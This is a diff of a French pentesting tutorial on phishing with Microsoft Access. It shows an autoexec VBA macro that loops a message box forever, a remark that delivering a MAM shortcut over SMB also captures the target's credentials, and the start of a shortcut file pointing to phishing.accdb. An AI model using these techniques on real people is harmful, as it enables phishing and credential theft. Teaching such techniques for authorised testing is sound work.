@@ -1,7 +1,6 @@
 Prérequis :
 
 -   Programmation en VBA
-    
 -   Compréhension général des services Microsoft en Pentesting.
     
 
@@ -42,7 +41,7 @@ End Function
 
 Sub func()
 	do
-		Msgbox"RISTBS LE AKER PRO",0+16,"An0nym0us"
+	  Msgbox"RISTBS LE AKER PRO",0+16,"An0nym0us"
 	loop
 End Sub
 ```
@@ -53,7 +52,7 @@ pour mettre une macro et mettre l'autoexec, aller dans `Créer`->`Macro` et ajou
 
 Utilisation de MAM sur un serveur HTTP mais on peut utiliser un partage SMB ce qui va en meme temps volé les creds de la cible.
 
-```bash
+```powershell
 [Shortcut Properties]
 AccessShortcutVersion=1
 DatabaseName=phishing.accdb
